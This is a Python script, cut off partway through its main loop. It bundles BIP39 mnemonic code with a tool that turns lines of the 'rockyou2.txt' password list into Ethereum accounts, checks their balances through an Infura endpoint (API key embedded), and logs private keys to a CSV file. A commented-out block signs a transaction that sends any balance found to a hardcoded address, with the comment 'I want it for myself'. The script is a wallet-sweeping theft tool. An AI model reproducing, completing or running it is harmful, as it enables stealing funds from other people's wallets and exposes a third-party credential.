#!/usr/bin/env python3

# Project TODOs
#
### Check for any ERC tokens
### Add more wordlists to source file
### Add other-language wordlists
### Pull in any source files in a directory


#############################################
#
#  Uses parts of: https://github.com/de-centralized-systems/python-bip39/
#  All credit for what code was used in this goes to the original devs
#
############################################

import hashlib  # for checking integrity of wordlist and mnemonic phrase checksum
import hmac  # for toseed functionality
import unicodedata  # as required by toseed functionality to perform NFKD normalization of mnemonic phrase
import sys, csv, argparse

from sys import getsizeof # Because apparently it will shit the bed otherwise
from typing import Tuple, Dict, Optional, List  # for typing

###
# Wordlist definition 
###


def verify_wordlist(*words: str) -> Tuple[str, ...]:
    """Verifies that the words given in this source file match the English wordlist specified in BIP39.
    The SHA256 hash below is derived from the original wordlist at:
    https://github.com/bitcoin/bips/blob/master/bip-0039/english.txt
    """
    words_sha256 = hashlib.sha256(("\n".join(words) + "\n").encode()).hexdigest()
    assert (
        words_sha256
        == "2f5eed53a4727b4bf8880d8f3f199efc90e58503646d9ff8eff3a2ed3b24dbda"
    )
    return words


# The BIP39 wordlist (English) is directly integrated to this Python file to make it a standalone file.
# Used by the encode function to map 0-based word indices to the specified words.
# fmt: off
INDEX_TO_WORD_TABLE: Tuple[str, ...] = verify_wordlist(
    "abandon",  "ability",  "able",     "about",    "above",    "absent",   "absorb",   "abstract", 
    "absurd",   "abuse",    "access",   "accident", "account",  "accuse",   "achieve",  "acid",     
    "acoustic", "acquire",  "across",   "act",      "action",   "actor",    "actress",  "actual",   
    "adapt",    "add",      "addict",   "address",  "adjust",   "admit",    "adult",    "advance",  
    "advice",   "aerobic",  "affair",   "afford",   "afraid",   "again",    "age",      "agent",    
    "agree",    "ahead",    "aim",      "air",      "airport",  "aisle",    "alarm",    "album",    
    "alcohol",  "alert",    "alien",    "all",      "alley",    "allow",    "almost",   "alone",    
    "alpha",    "already",  "also",     "alter",    "always",   "amateur",  "amazing",  "among",    
    "amount",   "amused",   "analyst",  "anchor",   "ancient",  "anger",    "angle",    "angry",    
    "animal",   "ankle",    "announce", "annual",   "another",  "answer",   "antenna",  "antique",  
    "anxiety",  "any",      "apart",    "apology",  "appear",   "apple",    "approve",  "april",    
    "arch",     "arctic",   "area",     "arena",    "argue",    "arm",      "armed",    "armor",    
    "army",     "around",   "arrange",  "arrest",   "arrive",   "arrow",    "art",      "artefact", 
    "artist",   "artwork",  "ask",      "aspect",   "assault",  "asset",    "assist",   "assume",   
    "asthma",   "athlete",  "atom",     "attack",   "attend",   "attitude", "attract",  "auction",  
    "audit",    "august",   "aunt",     "author",   "auto",     "autumn",   "average",  "avocado",  
    "avoid",    "awake",    "aware",    "away",     "awesome",  "awful",    "awkward",  "axis",     
    "baby",     "bachelor", "bacon",    "badge",    "bag",      "balance",  "balcony",  "ball",     
    "bamboo",   "banana",   "banner",   "bar",      "barely",   "bargain",  "barrel",   "base",     
    "basic",    "basket",   "battle",   "beach",    "bean",     "beauty",   "because",  "become",   
    "beef",     "before",   "begin",    "behave",   "behind",   "believe",  "below",    "belt",     
    "bench",    "benefit",  "best",     "betray",   "better",   "between",  "beyond",   "bicycle",  
    "bid",      "bike",     "bind",     "biology",  "bird",     "birth",    "bitter",   "black",    
    "blade",    "blame",    "blanket",  "blast",    "bleak",    "bless",    "blind",    "blood",    
    "blossom",  "blouse",   "blue",     "blur",     "blush",    "board",    "boat",     "body",     
    "boil",     "bomb",     "bone",     "bonus",    "book",     "boost",    "border",   "boring",   
    "borrow",   "boss",     "bottom",   "bounce",   "box",      "boy",      "bracket",  "brain",    
    "brand",    "brass",    "brave",    "bread",    "breeze",   "brick",    "bridge",   "brief",    
    "bright",   "bring",    "brisk",    "broccoli", "broken",   "bronze",   "broom",    "brother",  
    "brown",    "brush",    "bubble",   "buddy",    "budget",   "buffalo",  "build",    "bulb",     
    "bulk",     "bullet",   "bundle",   "bunker",   "burden",   "burger",   "burst",    "bus",      
    "business", "busy",     "butter",   "buyer",    "buzz",     "cabbage",  "cabin",    "cable",    
    "cactus",   "cage",     "cake",     "call",     "calm",     "camera",   "camp",     "can",      
    "canal",    "cancel",   "candy",    "cannon",   "canoe",    "canvas",   "canyon",   "capable",  
    "capital",  "captain",  "car",      "carbon",   "card",     "cargo",    "carpet",   "carry",    
    "cart",     "case",     "cash",     "casino",   "castle",   "casual",   "cat",      "catalog",  
    "catch",    "category", "cattle",   "caught",   "cause",    "caution",  "cave",     "ceiling",  
    "celery",   "cement",   "census",   "century",  "cereal",   "certain",  "chair",    "chalk",    
    "champion", "change",   "chaos",    "chapter",  "charge",   "chase",    "chat",     "cheap",    
    "check",    "cheese",   "chef",     "cherry",   "chest",    "chicken",  "chief",    "child",    
    "chimney",  "choice",   "choose",   "chronic",  "chuckle",  "chunk",    "churn",    "cigar",    
    "cinnamon", "circle",   "citizen",  "city",     "civil",    "claim",    "clap",     "clarify",  
    "claw",     "clay",     "clean",    "clerk",    "clever",   "click",    "client",   "cliff",    
    "climb",    "clinic",   "clip",     "clock",    "clog",     "close",    "cloth",    "cloud",    
    "clown",    "club",     "clump",    "cluster",  "clutch",   "coach",    "coast",    "coconut",  
    "code",     "coffee",   "coil",     "coin",     "collect",  "color",    "column",   "combine",  
    "come",     "comfort",  "comic",    "common",   "company",  "concert",  "conduct",  "confirm",  
    "congress", "connect",  "consider", "control",  "convince", "cook",     "cool",     "copper",   
    "copy",     "coral",    "core",     "corn",     "correct",  "cost",     "cotton",   "couch",    
    "country",  "couple",   "course",   "cousin",   "cover",    "coyote",   "crack",    "cradle",   
    "craft",    "cram",     "crane",    "crash",    "crater",   "crawl",    "crazy",    "cream",    
    "credit",   "creek",    "crew",     "cricket",  "crime",    "crisp",    "critic",   "crop",     
    "cross",    "crouch",   "crowd",    "crucial",  "cruel",    "cruise",   "crumble",  "crunch",   
    "crush",    "cry",      "crystal",  "cube",     "culture",  "cup",      "cupboard", "curious",  
    "current",  "curtain",  "curve",    "cushion",  "custom",   "cute",     "cycle",    "dad",      
    "damage",   "damp",     "dance",    "danger",   "daring",   "dash",     "daughter", "dawn",     
    "day",      "deal",     "debate",   "debris",   "decade",   "december", "decide",   "decline",  
    "decorate", "decrease", "deer",     "defense",  "define",   "defy",     "degree",   "delay",    
    "deliver",  "demand",   "demise",   "denial",   "dentist",  "deny",     "depart",   "depend",   
    "deposit",  "depth",    "deputy",   "derive",   "describe", "desert",   "design",   "desk",     
    "despair",  "destroy",  "detail",   "detect",   "develop",  "device",   "devote",   "diagram",  
    "dial",     "diamond",  "diary",    "dice",     "diesel",   "diet",     "differ",   "digital",  
    "dignity",  "dilemma",  "dinner",   "dinosaur", "direct",   "dirt",     "disagree", "discover", 
    "disease",  "dish",     "dismiss",  "disorder", "display",  "distance", "divert",   "divide",   
    "divorce",  "dizzy",    "doctor",   "document", "dog",      "doll",     "dolphin",  "domain",   
    "donate",   "donkey",   "donor",    "door",     "dose",     "double",   "dove",     "draft",    
    "dragon",   "drama",    "drastic",  "draw",     "dream",    "dress",    "drift",    "drill",    
    "drink",    "drip",     "drive",    "drop",     "drum",     "dry",      "duck",     "dumb",     
    "dune",     "during",   "dust",     "dutch",    "duty",     "dwarf",    "dynamic",  "eager",    
    "eagle",    "early",    "earn",     "earth",    "easily",   "east",     "easy",     "echo",     
    "ecology",  "economy",  "edge",     "edit",     "educate",  "effort",   "egg",      "eight",    
    "either",   "elbow",    "elder",    "electric", "elegant",  "element",  "elephant", "elevator", 
    "elite",    "else",     "embark",   "embody",   "embrace",  "emerge",   "emotion",  "employ",   
    "empower",  "empty",    "enable",   "enact",    "end",      "endless",  "endorse",  "enemy",    
    "energy",   "enforce",  "engage",   "engine",   "enhance",  "enjoy",    "enlist",   "enough",   
    "enrich",   "enroll",   "ensure",   "enter",    "entire",   "entry",    "envelope", "episode",  
    "equal",    "equip",    "era",      "erase",    "erode",    "erosion",  "error",    "erupt",    
    "escape",   "essay",    "essence",  "estate",   "eternal",  "ethics",   "evidence", "evil",     
    "evoke",    "evolve",   "exact",    "example",  "excess",   "exchange", "excite",   "exclude",  
    "excuse",   "execute",  "exercise", "exhaust",  "exhibit",  "exile",    "exist",    "exit",     
    "exotic",   "expand",   "expect",   "expire",   "explain",  "expose",   "express",  "extend",   
    "extra",    "eye",      "eyebrow",  "fabric",   "face",     "faculty",  "fade",     "faint",    
    "faith",    "fall",     "false",    "fame",     "family",   "famous",   "fan",      "fancy",    
    "fantasy",  "farm",     "fashion",  "fat",      "fatal",    "father",   "fatigue",  "fault",    
    "favorite", "feature",  "february", "federal",  "fee",      "feed",     "feel",     "female",   
    "fence",    "festival", "fetch",    "fever",    "few",      "fiber",    "fiction",  "field",    
    "figure",   "file",     "film",     "filter",   "final",    "find",     "fine",     "finger",   
    "finish",   "fire",     "firm",     "first",    "fiscal",   "fish",     "fit",      "fitness",  
    "fix",      "flag",     "flame",    "flash",    "flat",     "flavor",   "flee",     "flight",   
    "flip",     "float",    "flock",    "floor",    "flower",   "fluid",    "flush",    "fly",      
    "foam",     "focus",    "fog",      "foil",     "fold",     "follow",   "food",     "foot",     
    "force",    "forest",   "forget",   "fork",     "fortune",  "forum",    "forward",  "fossil",   
    "foster",   "found",    "fox",      "fragile",  "frame",    "frequent", "fresh",    "friend",   
    "fringe",   "frog",     "front",    "frost",    "frown",    "frozen",   "fruit",    "fuel",     
    "fun",      "funny",    "furnace",  "fury",     "future",   "gadget",   "gain",     "galaxy",   
    "gallery",  "game",     "gap",      "garage",   "garbage",  "garden",   "garlic",   "garment",  
    "gas",      "gasp",     "gate",     "gather",   "gauge",    "gaze",     "general",  "genius",   
    "genre",    "gentle",   "genuine",  "gesture",  "ghost",    "giant",    "gift",     "giggle",   
    "ginger",   "giraffe",  "girl",     "give",     "glad",     "glance",   "glare",    "glass",    
    "glide",    "glimpse",  "globe",    "gloom",    "glory",    "glove",    "glow",     "glue",     
    "goat",     "goddess",  "gold",     "good",     "goose",    "gorilla",  "gospel",   "gossip",   
    "govern",   "gown",     "grab",     "grace",    "grain",    "grant",    "grape",    "grass",    
    "gravity",  "great",    "green",    "grid",     "grief",    "grit",     "grocery",  "group",    
    "grow",     "grunt",    "guard",    "guess",    "guide",    "guilt",    "guitar",   "gun",      
    "gym",      "habit",    "hair",     "half",     "hammer",   "hamster",  "hand",     "happy",    
    "harbor",   "hard",     "harsh",    "harvest",  "hat",      "have",     "hawk",     "hazard",   
    "head",     "health",   "heart",    "heavy",    "hedgehog", "height",   "hello",    "helmet",   
    "help",     "hen",      "hero",     "hidden",   "high",     "hill",     "hint",     "hip",      
    "hire",     "history",  "hobby",    "hockey",   "hold",     "hole",     "holiday",  "hollow",   
    "home",     "honey",    "hood",     "hope",     "horn",     "horror",   "horse",    "hospital", 
    "host",     "hotel",    "hour",     "hover",    "hub",      "huge",     "human",    "humble",   
    "humor",    "hundred",  "hungry",   "hunt",     "hurdle",   "hurry",    "hurt",     "husband",  
    "hybrid",   "ice",      "icon",     "idea",     "identify", "idle",     "ignore",   "ill",      
    "illegal",  "illness",  "image",    "imitate",  "immense",  "immune",   "impact",   "impose",   
    "improve",  "impulse",  "inch",     "include",  "income",   "increase", "index",    "indicate", 
    "indoor",   "industry", "infant",   "inflict",  "inform",   "inhale",   "inherit",  "initial",  
    "inject",   "injury",   "inmate",   "inner",    "innocent", "input",    "inquiry",  "insane",   
    "insect",   "inside",   "inspire",  "install",  "intact",   "interest", "into",     "invest",   
    "invite",   "involve",  "iron",     "island",   "isolate",  "issue",    "item",     "ivory",    
    "jacket",   "jaguar",   "jar",      "jazz",     "jealous",  "jeans",    "jelly",    "jewel",    
    "job",      "join",     "joke",     "journey",  "joy",      "judge",    "juice",    "jump",     
    "jungle",   "junior",   "junk",     "just",     "kangaroo", "keen",     "keep",     "ketchup",  
    "key",      "kick",     "kid",      "kidney",   "kind",     "kingdom",  "kiss",     "kit",      
    "kitchen",  "kite",     "kitten",   "kiwi",     "knee",     "knife",    "knock",    "know",     
    "lab",      "label",    "labor",    "ladder",   "lady",     "lake",     "lamp",     "language", 
    "laptop",   "large",    "later",    "latin",    "laugh",    "laundry",  "lava",     "law",      
    "lawn",     "lawsuit",  "layer",    "lazy",     "leader",   "leaf",     "learn",    "leave",    
    "lecture",  "left",     "leg",      "legal",    "legend",   "leisure",  "lemon",    "lend",     
    "length",   "lens",     "leopard",  "lesson",   "letter",   "level",    "liar",     "liberty",  
    "library",  "license",  "life",     "lift",     "light",    "like",     "limb",     "limit",    
    "link",     "lion",     "liquid",   "list",     "little",   "live",     "lizard",   "load",     
    "loan",     "lobster",  "local",    "lock",     "logic",    "lonely",   "long",     "loop",     
    "lottery",  "loud",     "lounge",   "love",     "loyal",    "lucky",    "luggage",  "lumber",   
    "lunar",    "lunch",    "luxury",   "lyrics",   "machine",  "mad",      "magic",    "magnet",   
    "maid",     "mail",     "main",     "major",    "make",     "mammal",   "man",      "manage",   
    "mandate",  "mango",    "mansion",  "manual",   "maple",    "marble",   "march",    "margin",   
    "marine",   "market",   "marriage", "mask",     "mass",     "master",   "match",    "material", 
    "math",     "matrix",   "matter",   "maximum",  "maze",     "meadow",   "mean",     "measure",  
    "meat",     "mechanic", "medal",    "media",    "melody",   "melt",     "member",   "memory",   
    "mention",  "menu",     "mercy",    "merge",    "merit",    "merry",    "mesh",     "message",  
    "metal",    "method",   "middle",   "midnight", "milk",     "million",  "mimic",    "mind",     
    "minimum",  "minor",    "minute",   "miracle",  "mirror",   "misery",   "miss",     "mistake",  
    "mix",      "mixed",    "mixture",  "mobile",   "model",    "modify",   "mom",      "moment",   
    "monitor",  "monkey",   "monster",  "month",    "moon",     "moral",    "more",     "morning",  
    "mosquito", "mother",   "motion",   "motor",    "mountain", "mouse",    "move",     "movie",    
    "much",     "muffin",   "mule",     "multiply", "muscle",   "museum",   "mushroom", "music",    
    "must",     "mutual",   "myself",   "mystery",  "myth",     "naive",    "name",     "napkin",   
    "narrow",   "nasty",    "nation",   "nature",   "near",     "neck",     "need",     "negative", 
    "neglect",  "neither",  "nephew",   "nerve",    "nest",     "net",      "network",  "neutral",  
    "never",    "news",     "next",     "nice",     "night",    "noble",    "noise",    "nominee",  
    "noodle",   "normal",   "north",    "nose",     "notable",  "note",     "nothing",  "notice",   
    "novel",    "now",      "nuclear",  "number",   "nurse",    "nut",      "oak",      "obey",     
    "object",   "oblige",   "obscure",  "observe",  "obtain",   "obvious",  "occur",    "ocean",    
    "october",  "odor",     "off",      "offer",    "office",   "often",    "oil",      "okay",     
    "old",      "olive",    "olympic",  "omit",     "once",     "one",      "onion",    "online",   
    "only",     "open",     "opera",    "opinion",  "oppose",   "option",   "orange",   "orbit",    
    "orchard",  "order",    "ordinary", "organ",    "orient",   "original", "orphan",   "ostrich",  
    "other",    "outdoor",  "outer",    "output",   "outside",  "oval",     "oven",     "over",     
    "own",      "owner",    "oxygen",   "oyster",   "ozone",    "pact",     "paddle",   "page",     
    "pair",     "palace",   "palm",     "panda",    "panel",    "panic",    "panther",  "paper",    
    "parade",   "parent",   "park",     "parrot",   "party",    "pass",     "patch",    "path",     
    "patient",  "patrol",   "pattern",  "pause",    "pave",     "payment",  "peace",    "peanut",   
    "pear",     "peasant",  "pelican",  "pen",      "penalty",  "pencil",   "people",   "pepper",   
    "perfect",  "permit",   "person",   "pet",      "phone",    "photo",    "phrase",   "physical", 
    "piano",    "picnic",   "picture",  "piece",    "pig",      "pigeon",   "pill",     "pilot",    
    "pink",     "pioneer",  "pipe",     "pistol",   "pitch",    "pizza",    "place",    "planet",   
    "plastic",  "plate",    "play",     "please",   "pledge",   "pluck",    "plug",     "plunge",   
    "poem",     "poet",     "point",    "polar",    "pole",     "police",   "pond",     "pony",     
    "pool",     "popular",  "portion",  "position", "possible", "post",     "potato",   "pottery",  
    "poverty",  "powder",   "power",    "practice", "praise",   "predict",  "prefer",   "prepare",  
    "present",  "pretty",   "prevent",  "price",    "pride",    "primary",  "print",    "priority", 
    "prison",   "private",  "prize",    "problem",  "process",  "produce",  "profit",   "program",  
    "project",  "promote",  "proof",    "property", "prosper",  "protect",  "proud",    "provide",  
    "public",   "pudding",  "pull",     "pulp",     "pulse",    "pumpkin",  "punch",    "pupil",    
    "puppy",    "purchase", "purity",   "purpose",  "purse",    "push",     "put",      "puzzle",   
    "pyramid",  "quality",  "quantum",  "quarter",  "question", "quick",    "quit",     "quiz",     
    "quote",    "rabbit",   "raccoon",  "race",     "rack",     "radar",    "radio",    "rail",     
    "rain",     "raise",    "rally",    "ramp",     "ranch",    "random",   "range",    "rapid",    
    "rare",     "rate",     "rather",   "raven",    "raw",      "razor",    "ready",    "real",     
    "reason",   "rebel",    "rebuild",  "recall",   "receive",  "recipe",   "record",   "recycle",  
    "reduce",   "reflect",  "reform",   "refuse",   "region",   "regret",   "regular",  "reject",   
    "relax",    "release",  "relief",   "rely",     "remain",   "remember", "remind",   "remove",   
    "render",   "renew",    "rent",     "reopen",   "repair",   "repeat",   "replace",  "report",   
    "require",  "rescue",   "resemble", "resist",   "resource", "response", "result",   "retire",   
    "retreat",  "return",   "reunion",  "reveal",   "review",   "reward",   "rhythm",   "rib",      
    "ribbon",   "rice",     "rich",     "ride",     "ridge",    "rifle",    "right",    "rigid",    
    "ring",     "riot",     "ripple",   "risk",     "ritual",   "rival",    "river",    "road",     
    "roast",    "robot",    "robust",   "rocket",   "romance",  "roof",     "rookie",   "room",     
    "rose",     "rotate",   "rough",    "round",    "route",    "royal",    "rubber",   "rude",     
    "rug",      "rule",     "run",      "runway",   "rural",    "sad",      "saddle",   "sadness",  
    "safe",     "sail",     "salad",    "salmon",   "salon",    "salt",     "salute",   "same",     
    "sample",   "sand",     "satisfy",  "satoshi",  "sauce",    "sausage",  "save",     "say",      
    "scale",    "scan",     "scare",    "scatter",  "scene",    "scheme",   "school",   "science",  
    "scissors", "scorpion", "scout",    "scrap",    "screen",   "script",   "scrub",    "sea",      
    "search",   "season",   "seat",     "second",   "secret",   "section",  "security", "seed",     
    "seek",     "segment",  "select",   "sell",     "seminar",  "senior",   "sense",    "sentence", 
    "series",   "service",  "session",  "settle",   "setup",    "seven",    "shadow",   "shaft",    
    "shallow",  "share",    "shed",     "shell",    "sheriff",  "shield",   "shift",    "shine",    
    "ship",     "shiver",   "shock",    "shoe",     "shoot",    "shop",     "short",    "shoulder", 
    "shove",    "shrimp",   "shrug",    "shuffle",  "shy",      "sibling",  "sick",     "side",     
    "siege",    "sight",    "sign",     "silent",   "silk",     "silly",    "silver",   "similar",  
    "simple",   "since",    "sing",     "siren",    "sister",   "situate",  "six",      "size",     
    "skate",    "sketch",   "ski",      "skill",    "skin",     "skirt",    "skull",    "slab",     
    "slam",     "sleep",    "slender",  "slice",    "slide",    "slight",   "slim",     "slogan",   
    "slot",     "slow",     "slush",    "small",    "smart",    "smile",    "smoke",    "smooth",   
    "snack",    "snake",    "snap",     "sniff",    "snow",     "soap",     "soccer",   "social",   
    "sock",     "soda",     "soft",     "solar",    "soldier",  "solid",    "solution", "solve",    
    "someone",  "song",     "soon",     "sorry",    "sort",     "soul",     "sound",    "soup",     
    "source",   "south",    "space",    "spare",    "spatial",  "spawn",    "speak",    "special",  
    "speed",    "spell",    "spend",    "sphere",   "spice",    "spider",   "spike",    "spin",     
    "spirit",   "split",    "spoil",    "sponsor",  "spoon",    "sport",    "spot",     "spray",    
    "spread",   "spring",   "spy",      "square",   "squeeze",  "squirrel", "stable",   "stadium",  
    "staff",    "stage",    "stairs",   "stamp",    "stand",    "start",    "state",    "stay",     
    "steak",    "steel",    "stem",     "step",     "stereo",   "stick",    "still",    "sting",    
    "stock",    "stomach",  "stone",    "stool",    "story",    "stove",    "strategy", "street",   
    "strike",   "strong",   "struggle", "student",  "stuff",    "stumble",  "style",    "subject",  
    "submit",   "subway",   "success",  "such",     "sudden",   "suffer",   "sugar",    "suggest",  
    "suit",     "summer",   "sun",      "sunny",    "sunset",   "super",    "supply",   "supreme",  
    "sure",     "surface",  "surge",    "surprise", "surround", "survey",   "suspect",  "sustain",  
    "swallow",  "swamp",    "swap",     "swarm",    "swear",    "sweet",    "swift",    "swim",     
    "swing",    "switch",   "sword",    "symbol",   "symptom",  "syrup",    "system",   "table",    
    "tackle",   "tag",      "tail",     "talent",   "talk",     "tank",     "tape",     "target",   
    "task",     "taste",    "tattoo",   "taxi",     "teach",    "team",     "tell",     "ten",      
    "tenant",   "tennis",   "tent",     "term",     "test",     "text",     "thank",    "that",     
    "theme",    "then",     "theory",   "there",    "they",     "thing",    "this",     "thought",  
    "three",    "thrive",   "throw",    "thumb",    "thunder",  "ticket",   "tide",     "tiger",    
    "tilt",     "timber",   "time",     "tiny",     "tip",      "tired",    "tissue",   "title",    
    "toast",    "tobacco",  "today",    "toddler",  "toe",      "together", "toilet",   "token",    
    "tomato",   "tomorrow", "tone",     "tongue",   "tonight",  "tool",     "tooth",    "top",      
    "topic",    "topple",   "torch",    "tornado",  "tortoise", "toss",     "total",    "tourist",  
    "toward",   "tower",    "town",     "toy",      "track",    "trade",    "traffic",  "tragic",   
    "train",    "transfer", "trap",     "trash",    "travel",   "tray",     "treat",    "tree",     
    "trend",    "trial",    "tribe",    "trick",    "trigger",  "trim",     "trip",     "trophy",   
    "trouble",  "truck",    "true",     "truly",    "trumpet",  "trust",    "truth",    "try",      
    "tube",     "tuition",  "tumble",   "tuna",     "tunnel",   "turkey",   "turn",     "turtle",   
    "twelve",   "twenty",   "twice",    "twin",     "twist",    "two",      "type",     "typical",  
    "ugly",     "umbrella", "unable",   "unaware",  "uncle",    "uncover",  "under",    "undo",     
    "unfair",   "unfold",   "unhappy",  "uniform",  "unique",   "unit",     "universe", "unknown",  
    "unlock",   "until",    "unusual",  "unveil",   "update",   "upgrade",  "uphold",   "upon",     
    "upper",    "upset",    "urban",    "urge",     "usage",    "use",      "used",     "useful",   
    "useless",  "usual",    "utility",  "vacant",   "vacuum",   "vague",    "valid",    "valley",   
    "valve",    "van",      "vanish",   "vapor",    "various",  "vast",     "vault",    "vehicle",  
    "velvet",   "vendor",   "venture",  "venue",    "verb",     "verify",   "version",  "very",     
    "vessel",   "veteran",  "viable",   "vibrant",  "vicious",  "victory",  "video",    "view",     
    "village",  "vintage",  "violin",   "virtual",  "virus",    "visa",     "visit",    "visual",   
    "vital",    "vivid",    "vocal",    "voice",    "void",     "volcano",  "volume",   "vote",     
    "voyage",   "wage",     "wagon",    "wait",     "walk",     "wall",     "walnut",   "want",     
    "warfare",  "warm",     "warrior",  "wash",     "wasp",     "waste",    "water",    "wave",     
    "way",      "wealth",   "weapon",   "wear",     "weasel",   "weather",  "web",      "wedding",  
    "weekend",  "weird",    "welcome",  "west",     "wet",      "whale",    "what",     "wheat",    
    "wheel",    "when",     "where",    "whip",     "whisper",  "wide",     "width",    "wife",     
    "wild",     "will",     "win",      "window",   "wine",     "wing",     "wink",     "winner",   
    "winter",   "wire",     "wisdom",   "wise",     "wish",     "witness",  "wolf",     "woman",    
    "wonder",   "wood",     "wool",     "word",     "work",     "world",    "worry",    "worth",    
    "wrap",     "wreck",    "wrestle",  "wrist",    "write",    "wrong",    "yard",     "year",     
    "yellow",   "you",      "young",    "youth",    "zebra",    "zero",     "zone",     "zoo",  
)
# fmt: on

# Used by the decode function to map the given words back to their 0-based indices.
WORD_TO_INDEX_TABLE: Dict[str, int] = {
    word: i for i, word in enumerate(INDEX_TO_WORD_TABLE)
}

# Number of PBKDF2 round to generate seed
PBKDF2_ROUNDS = 2048

#####
#
# BIP39 encoding and decoding #
#  
#####
                                                                                                          ###
#
# Functions to convert from and to BIP39 compatible mnemonic phrases.                                              #
# This implementation deliberately considers only the official english word list.                                                   #
# https://github.com/bitcoin/bips/blob/master/bip-0039.mediawiki   
#
###


def encode_bytes(entropy: bytes) -> str:
    """Converts a given sequence of bytes into a BIP39 mnemonic phrase. This implementation only covers the English
    BIP39 wordlist as other wordlist are often poorly supported by other software and hardware devices.
    """
    num_bits_entropy = len(entropy) * 8
    num_bits_checksum = num_bits_entropy // 32
    num_words = (num_bits_entropy + num_bits_checksum) // 11
    if num_bits_entropy not in {128, 160, 192, 224, 256}:
        raise EncodingError(
            "Invalid number of bytes provided, "
            "BIP39 mnemonic phrases are only specified for 128, 160, 192, 224, or 256 bits."
        )

    # Compute the checksum as the first bits of the sha256 hash of the data.
    # As the checksum has at most 8 bits, we can directly access the first byte of the hash.
    checksum = hashlib.sha256(entropy).digest()[0] >> (8 - num_bits_checksum)

    # Covert the entropy to a number of easier handling of the 11-bit parts and append the checksum.
    entropy_and_checksum = (
        int.from_bytes(entropy, byteorder="big") << num_bits_checksum
    ) | checksum

    # Convert each 11 bit chunk into a word.
    remaining_data = entropy_and_checksum
    words: List[str] = []
    for _ in range(num_words):
        words.append(INDEX_TO_WORD_TABLE[remaining_data & 0b111_1111_1111])
        remaining_data >>= 11

    # As we started with the conversion progress with the rightmost bits of `entropy_and_checksum` the list of words
    # needs to be reversed before we can join and return the final mnemonic phrase.
    words.reverse()
    return " ".join(words)


def decode_phrase(phrase: str) -> bytes:
    """Converts a given BIP39 mnemonic phrase to a sequence of bytes. The (weak) integrated checksum is verified and a
    `DecodingError` is raised in case the mnemonic is invalid. This implementation only covers the English BIP39
    wordlist as other wordlist are often poorly supported by other software and hardware devices.
    """
    if not all(c in " abcdefghijklmnopqrstuvwxyz" for c in phrase):
        raise DecodingError(
            f"Invalid mnemonic phrase {repr(phrase)} provided, phrase contains an invalid character."
        )

    words = phrase.split()
    num_bits_entropy = get_entropy_bits(len(words))
    num_bits_checksum = num_bits_entropy // 32

    bits = 0
    for word in words:
        bits <<= 11
        try:
            bits |= WORD_TO_INDEX_TABLE[word]
        except KeyError:
            raise DecodingError(
                f"Invalid mnemonic phrase {repr(phrase)} provided, word '{word}' is not in the BIP39 wordlist."
            )

    checksum = bits & (2 ** num_bits_checksum - 1)
    bits >>= num_bits_checksum
    data = bits.to_bytes(num_bits_entropy // 8, byteorder="big")

    checksum_for_verification = hashlib.sha256(data).digest()[0] >> (
        8 - num_bits_checksum
    )
    if checksum != checksum_for_verification:
        raise DecodingError(
            f"Invalid mnemonic phrase {repr(phrase)} provided, checksum invalid!"
        )

    return data


def check_phrase(phrase: str) -> bool:
    """Only checks the checksum of a phrase and returns true if valid and false otherwise"""
    try:
        decode_phrase(phrase)
    except DecodingError:
        return False
    return True


def normalize_string(txt: str) -> str:
    """As we only consider english wordlists and str input"""
    assert type(txt) is str
    return unicodedata.normalize("NFKD", txt)


def phrase_to_seed(phrase: str, passphrase: str = "") -> bytes:
    decode_phrase(phrase)  # check phrase and raise exception on error
    phrase = normalize_string(phrase)
    passphrase = "mnemonic" + normalize_string(passphrase)
    phrase_bytes = phrase.encode("utf-8")
    passphrase_bytes = passphrase.encode("utf-8")
    stretched = hashlib.pbkdf2_hmac(
        "sha512", phrase_bytes, passphrase_bytes, PBKDF2_ROUNDS
    )
    return stretched[:64]


def get_entropy_bits(num_words: int) -> int:
    """Returns the number of entropy bits in a mnemonic phrase with the given number of words.
    Raises a `DecodingError` if the given number of words is invalid.
    """
    try:
        return {12: 128, 15: 160, 18: 192, 21: 224, 24: 256}[num_words]
    except KeyError:
        raise DecodingError(
            "Invalid number of words provided, "
            "BIP39 mnemonic phrases are only specified for 12, 15, 18, 21, or 24 words."
        )

#####
#
# Error definitions
#
#####

class AppError(Exception):
    def __init__(self, message: str):
        super().__init__(f"ERROR: {message} \nExiting.\n")

class EncodingError(AppError):
    """Raised if a given sequences of bytes cannot be encoded as BIP39 mnemonic phrase."""

class DecodingError(AppError):
    """Raised if a given BIP39 mnemonic phrase cannot be decoded into a sequence of bytes."""

#############################################
#
# End code creation credit: https://github.com/de-centralized-systems/python-bip39/
#
############################################


from web3 import Web3
from eth_keys import keys
from eth_utils import *
from eth_account.account import Account


infura_url = "https://mainnet.infura.io/v3/806ba3d6957f4ec78a8664f51bc741d5"
ganache_url = "http://127.0.0.1:7545"
web3 = Web3(Web3.HTTPProvider(infura_url))
#web3 = Web3(Web3.HTTPProvider(ganache_url))

#print("Connected: {}".format(web3.isConnected()))

# Use the 'entropy' parameter to create an account
# TODO: Find a more efficient place to move the file operations
def generateAddress(entropy):
	tempAcct = Account.create(extra_entropy=entropy)
	accountSender = tempAcct.address # Public key/address
	pKey = tempAcct.key # Private key
	#pKey = encode_hex(tempAcct.key) # Usually won't work with Metamask
	return accountSender, pKey

# Roll reporting into one function
def reporting(pubKey, privKey, balance):
	fileName="generated-keypairs.csv"
	#header = ['Ether Wallet Public Key', 'Ether Wallet Private Key', 'ETH Balance']
	data = [pubKey, privKey, balance]
	with open(fileName, 'a', encoding='UTF8', newline='') as dictionaryFile:
		writer = csv.writer(dictionaryFile)
		writer.writerow(data)

# The actual work
def findANonZeroBalance(entropy):
	print(str(entropy))
	# Create a wallet
	pubKey, privKey = generateAddress(entropy)

	# Verify if the balance is > 0 (almost guaranteed to be false)
	nonce = web3.eth.getTransactionCount(pubKey)
	balance = web3.eth.getBalance(pubKey)
	reporting(pubKey, privKey, balance)

	# Jackpot
	if (balance > 0):
		# I want it for myself
		accountRecipient = '0x2e2b43E20FCFC44D4cfCB16A723270c7a0Bc914F'

		# TODO: Payload
		print(web3.fromWei(balance, "ether"))

"""
		# Max gas we're willing to pay
		maxGasPerTx = 150 # Probably too high
		tx = {
		    'nonce': nonce,
		    'to': accountRecipient,
		    'value': balance,
		    'gas': 2000000,		  
		    'gasPrice': web3.toWei(maxGasPerTx, 'gwei')
		}

		signed_tx = web3.eth.account.signTransaction(tx, private_key)

		tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)

		print(web3.toHex(tx_hash))
"""	
	
def main():
	# Open up our wordlist
	keygenfile = open('rockyou2.txt')

	for lineNum, textLine in enumerate(keygenfile):
		# Get the line from the file and format it for our Ethereum tools
